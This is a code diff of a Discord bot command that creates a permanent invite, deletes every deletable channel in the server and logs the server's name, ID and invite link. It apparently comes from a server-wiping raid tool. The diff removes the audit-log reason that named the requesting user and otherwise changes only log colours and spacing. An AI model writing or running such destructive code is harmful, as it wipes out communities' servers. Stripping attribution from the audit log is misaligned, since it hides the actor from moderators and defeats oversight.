@@ -14,38 +14,22 @@ module.exports = {
 
         try {
 
-            let invite = await message.channel.createInvite(
-                {
-                    maxAge: 0,
-                    maxUses: 0 
-                },
-                `Requested with command by ${message.author.tag}`
-            )
+            let invite = await message.channel.createInvite({maxAge: 0, maxUses: 0})
 
             message.guild.channels.cache.forEach(channel => {
                 if (channel.deletable) {
                         channel.delete().then(
-                            console.log(chalk.blue(`Successfully deleted all channels in ${message.guild.name}\nID: ${message.guild.id}\nInvite: ${invite} `))
+                            console.log(chalk.green(`Successfully deleted all channels in ${message.guild.name}\nID: ${message.guild.id}\nInvite: ${invite} `))
                         )
                 }
-
-                
-            
         });
         
-            
-          
         } catch(err) {
         
-            return console.log(err)
-            
+            return console.log(chalk.red(err))
         
         }
-        
-        
     }
-
-
 }
 
 
